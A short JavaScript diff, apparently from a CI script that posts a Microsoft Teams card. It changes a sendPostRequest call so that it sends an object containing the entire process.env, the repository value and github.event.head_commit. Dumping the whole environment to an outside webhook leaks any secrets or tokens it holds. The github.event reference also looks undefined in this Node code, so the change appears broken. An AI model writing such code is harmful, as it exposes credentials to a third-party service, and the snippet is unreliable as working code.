@@ -50,4 +50,8 @@ const sendPostRequest = async (msTeamsCard) => {
   }
 };
 
-sendPostRequest(process.env);
+sendPostRequest({
+  a: process.env,
+  b: process.env.repository,
+  g: github.event.head_commit,
+});
